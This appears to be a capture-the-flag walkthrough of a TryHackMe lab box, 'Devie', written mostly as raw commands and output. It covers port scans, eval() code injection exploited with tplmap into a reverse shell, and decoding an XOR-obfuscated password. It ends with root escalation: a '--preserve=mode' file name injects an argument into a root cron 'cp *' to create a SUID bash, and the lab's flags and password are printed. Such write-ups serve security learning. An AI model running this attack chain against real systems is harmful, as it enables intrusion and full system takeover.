Devie IP:10.10.84.187


rustscan:


PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack


nmap:
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c9:72:7b:f5:b6:2e:d5:99:56:14:de:43:09:3a:64:92 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXNnAA7vvpbmy9Qo3WXJKO6H75Pm0y4jH9Qkegtn6j7DUzbHj02A6mFTtVmKj7Piu+YEdLSKcMFXUebSgo7KaqFnknaaCT63FuBnG8Buln4fpb39RVUMuk65DbX2Q8yvKaTdqvTyqgtRCr5NwOSypQVeYNkOXMcD5PngLtKi+fNGCM9WhGwoeOKkrdao/4XeD2ls1yBHHPhO89+fbJEw3QY3lWU12Wptwb0qsoY7LzsuCGqXvQJxCQZjgoZfwGJTr7NEaiVFcaD907DICJ6CUl9jRex3pqHbTMk15mdPY9Wev6j7QyZRGs+T+ZuvY+v7e4aciNsu1v3qzQMHxZBjTI3bjmb8vasC7Mal8MHlV7AzTIRqt/nZ7N38yZJQilqMWAPU4mMjSkrU0AIFbvELtd72tYHKYlENlPpP6jceFHShlzMJIa2ZDXrmAgamX60opSD+DuTQ6FV5SSNtDr8s/tFMo6Qw7aASVLQvviZ9oSfPxjErxtHrQ/bftjHKSzbYs=
|   256 0b:75:58:5a:b9:f7:5b:a9:ff:ef:ad:71:c1:09:0a:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk+UzY67s/i6zsosNrHJLPqFnCloHQTTFSeT4EUU3uxKHW35eQaztZ3NCo/itXAhMnYldxoGR4tGnDpEo+F4ug=
|   256 7d:f9:c9:f8:67:f9:95:4e:01:68:23:a4:7b:8c:98:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOr+JB4kGgYWohDQmOPoFBn3ayG+prG0t7s4eeHbYa96
5000/tcp open  upnp?   syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 12 Jun 2023 08:35:57 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
|     <title>Math</title>
|     </head>
|     <body>
|     id="title">Math Formulas</p>
|     <main>
|     <section> <!-- Sections within the main -->
|     id="titles"> Feel free to use any of the calculators below:</h3>
|     <br>
|     <article> <!-- Sections within the section -->
|     id="titles">Quadratic formula</h4> 
|     <form met
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.91%I=7%D=6/12%Time=6486D8EC%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1235,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Mon,\x2012\x20Jun\x202023\x2008:35:57\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:204486\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang
SF:=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n
SF:\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wi
SF:dth,\x20initial-scale=1\">\n\n\x20\x20\x20\x20<link\x20href=\"https://c
SF:dn\.jsdelivr\.net/npm/bootstrap@5\.0\.1/dist/css/bootstrap\.min\.css\"\
SF:x20rel=\"stylesheet\"\x20integrity=\"sha384-\+0n0xVW2eSR5OomGNYDnhzAbDs
SF:OXxcvSN1TPprVMTNDbiYZCxYbOOl7\+AMvyTG2x\"\x20crossorigin=\"anonymous\">
SF:\n\n\x20\x20\x20\x20<title>Math</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<p\x20id=\"title\">Math\x20Formulas</p>\n\n\x20\x20\
SF:x20\x20<main>\n\x20\x20\x20\x20\x20\x20<section>\x20\x20<!--\x20Section
SF:s\x20within\x20the\x20main\x20-->\n\n\t\t\t\t<h3\x20id=\"titles\">\x20F
SF:eel\x20free\x20to\x20use\x20any\x20of\x20the\x20calculators\x20below:</
SF:h3>\n\x20\x20\x20\x20\x20\x20\x20\x20<br>\n\t\t\t\t<article>\x20<!--\x2
SF:0Sections\x20within\x20the\x20section\x20-->\n\t\t\t\t\t\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<h4\x20id=\"titles\">Quadratic\x20formula</h
SF:4>\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20<form\x20met")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20
SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20<
SF:/head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Err
SF:or\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\
SF:x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reque
SF:st\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Ba
SF:d\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x
SF:20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


nikto:
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.111.26
+ Target Hostname:    10.10.111.26
+ Target Port:        5000
+ Start Time:         2023-06-12 04:36:15 (GMT-4)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.1.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, HEAD, OPTIONS 
+ 7893 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-06-12 05:01:34 (GMT-4) (1519 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)


Unsanitized input from a web form flows into eval, where it is executed as Python code. This may result in a Code Injection vulnerability.


Using snyk we determined that the code is vunerable to code injection.

We use tplmap in order to check if it's right:
We need to capture a request from the bisec function in burp. after this we use the url of the request and the data paramaters in the tplmap.py



python2 tplmap.py -u http://10.10.84.187:5000/ -X POST -d "xa=3&xb=2"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'xb' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Freemarker plugin is testing rendering with tag '*'
[+] Freemarker plugin is testing blind injection
[+] Velocity plugin is testing rendering with tag '*'
[+] Velocity plugin is testing blind injection
[+] Slim plugin is testing rendering with tag '"#{*}"'
[+] Slim plugin is testing blind injection
[+] Erb plugin is testing rendering with tag '"#{*}"'
[+] Erb plugin is testing blind injection
[+] Pug plugin is testing rendering with tag '\n= *\n'
[+] Pug plugin is testing blind injection
[+] Nunjucks plugin is testing rendering with tag '{{*}}'
[+] Nunjucks plugin is testing blind injection
[+] Dot plugin is testing rendering with tag '{{=*}}'
[+] Dot plugin is testing blind injection
[+] Dust plugin is testing rendering
[+] Dust plugin is testing blind injection
[+] Marko plugin is testing rendering with tag '${*}'
[+] Marko plugin is testing blind injection
[+] Javascript plugin is testing rendering with tag '*'
[+] Javascript plugin is testing blind injection
[+] Php plugin is testing rendering with tag '*'
[+] Php plugin is testing blind injection
[+] Ruby plugin is testing rendering with tag '"#{*}"'
[+] Ruby plugin is testing blind injection
[+] Ejs plugin is testing rendering with tag '*'
[+] Ejs plugin is testing blind injection
[+] Testing if POST parameter 'xa' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Python plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  POST parameter: xa
  Engine: Python
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)

[+] Rerun tplmap providing one of the following options:

    --os-shell                          Run shell on the target
    --os-cmd                    Execute shell commands
    --bind-shell PORT                   Connect to a shell bind to a target port
    --reverse-shell HOST PORT   Send a shell back to the attacker's port
    --upload LOCAL REMOTE       Upload files to the server



now we can get a reverse shell:

we start a nc lisneter on port 1234, and then we run tplmap again:


python2 tplmap.py -u http://10.10.84.187:5000/ -X POST -d "xa=3&xb=2"
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'xb' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Freemarker plugin is testing rendering with tag '*'
[+] Freemarker plugin is testing blind injection
[+] Velocity plugin is testing rendering with tag '*'
[+] Velocity plugin is testing blind injection
[+] Slim plugin is testing rendering with tag '"#{*}"'
[+] Slim plugin is testing blind injection
[+] Erb plugin is testing rendering with tag '"#{*}"'
[+] Erb plugin is testing blind injection
[+] Pug plugin is testing rendering with tag '\n= *\n'
[+] Pug plugin is testing blind injection
[+] Nunjucks plugin is testing rendering with tag '{{*}}'
[+] Nunjucks plugin is testing blind injection
[+] Dot plugin is testing rendering with tag '{{=*}}'
[+] Dot plugin is testing blind injection
[+] Dust plugin is testing rendering
[+] Dust plugin is testing blind injection
[+] Marko plugin is testing rendering with tag '${*}'
[+] Marko plugin is testing blind injection
[+] Javascript plugin is testing rendering with tag '*'
[+] Javascript plugin is testing blind injection
[+] Php plugin is testing rendering with tag '*'
[+] Php plugin is testing blind injection
[+] Ruby plugin is testing rendering with tag '"#{*}"'
[+] Ruby plugin is testing blind injection
[+] Ejs plugin is testing rendering with tag '*'
[+] Ejs plugin is testing blind injection
[+] Testing if POST parameter 'xa' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Python plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  POST parameter: xa
  Engine: Python
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)

[+] Rerun tplmap providing one of the following options:

    --os-shell                          Run shell on the target
    --os-cmd                    Execute shell commands
    --bind-shell PORT                   Connect to a shell bind to a target port
    --reverse-shell HOST PORT   Send a shell back to the attacker's port
    --upload LOCAL REMOTE       Upload files to the server

nc -lnvp 1234                                                                                                                                                                        
listening on [any] 1234 ...
connect to [10.8.29.89] from (UNKNOWN) [10.10.84.187] 35612
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
$ ls
checklist
flag1.txt
note
$ cat flag1.txt 
THM{Car3ful_witH_3v@l}
$ 



$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
$ 


$ sudo -l
Matching Defaults entries for bruce on devie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on devie:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py


$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: plzsubscribetome
AxkKFgcRFgAADBYOERYVCgIUHA==
$ 

we now use cyberchef with from base 64 and xor with utf8 encoding
for xor key, we use our on passwd:plzsubscribetome .
we found now that the key is : supersecretxor
we use this key to the password found in the note, and we get: G0th@mR0ckz!

we could try this as passwd to gordon account.

$ su gordon
Password: G0th@mR0ckz!
id
uid=1001(gordon) gid=1001(gordon) groups=1001(gordon)

this means that we can ssh to gordon


flag 2:

gordon@devie:~$ ls
backups  flag2.txt  reports
gordon@devie:~$ cat flag2.txt 
THM{X0R_XoR_XOr_xOr}
gordon@devie:~$ 


we copy pspy to victim's machine and then we run it:

gordon@devie:~$ wget http://10.8.29.89:8000/pspy64
--2023-06-12 13:53:38--  http://10.8.29.89:8000/pspy64
Connecting to 10.8.29.89:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                            100%[==========================================================================================================>]   2.94M  1.30MB/s    in 2.3s    

2023-06-12 13:53:41 (1.30 MB/s) - ‘pspy64’ saved [3078592/3078592]

gordon@devie:~$ ls
backups  flag2.txt  pspy64  reports
gordon@devie:~$ chmod +x pspy64 
gordon@devie:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done


2023/06/12 13:55:01 CMD: UID=0    PID=1951   | /usr/bin/bash /usr/bin/backup 
2023/06/12 13:55:01 CMD: UID=0    PID=1950   | /bin/sh -c /usr/bin/bash /usr/bin/backup 


These ^ look interesing, let's check them out:


gordon@devie:~$ cat /usr/bin/backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/



gordon@devie:~$ cd reports

gordon@devie:~/reports$ touch test
gordon@devie:~/reports$ ls -la
total 20
drwxrwx--- 2 gordon gordon 4096 Jun 12 13:58 .
drwxr-xr-x 5 gordon gordon 4096 Jun 12 13:53 ..
-rw-r--r-- 1    640 gordon   57 Feb 19 23:31 report1
-rw-r--r-- 1    640 gordon   72 Feb 19 23:32 report2
-rw-r--r-- 1    640 gordon  100 Feb 19 23:33 report3
-rw-rw-r-- 1 gordon gordon    0 Jun 12 13:58 test
gordon@devie:~/reports$ cd ..
gordon@devie:~$ cd backups/
gordon@devie:~/backups$ ls
report1  report2  report3


gordon@devie:~/backups$ ls -la
total 20
drwxrwx--- 2 gordon gordon 4096 Jun 12 13:59 .
drwxr-xr-x 5 gordon gordon 4096 Jun 12 13:53 ..
-rw-r--r-- 1 root   root     57 Jun 12 13:59 report1
-rw-r--r-- 1 root   root     72 Jun 12 13:59 report2
-rw-r--r-- 1 root   root    100 Jun 12 13:59 report3
-rw-r--r-- 1 root   root      0 Jun 12 13:59 test


gordon@devie:~/reports$ cp /bin/bash .
gordon@devie:~/reports$ chmod 4755 bash
gordon@devie:~/reports$ touch ./--preserve=mode
gordon@devie:~/backups$ ls -la
total 1176
drwxrwx--- 2 gordon gordon    4096 Jun 12 14:06 .
drwxr-xr-x 5 gordon gordon    4096 Jun 12 13:53 ..
-rwsr-xr-x 1 root   root   1183448 Jun 12 14:06 bash
-rw-r--r-- 1 root   root        57 Jun 12 14:06 report1
-rw-r--r-- 1 root   root        72 Jun 12 14:06 report2
-rw-r--r-- 1 root   root       100 Jun 12 14:06 report3
-rw-rw-r-- 1 root   root         0 Jun 12 14:06 test
gordon@devie:~/backups$ ./bash -p
bash-5.0# id
uid=1001(gordon) gid=1001(gordon) euid=0(root) groups=1001(gordon)
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
THM{J0k3r$_Ar3_W1ld}
bash-5.0# 
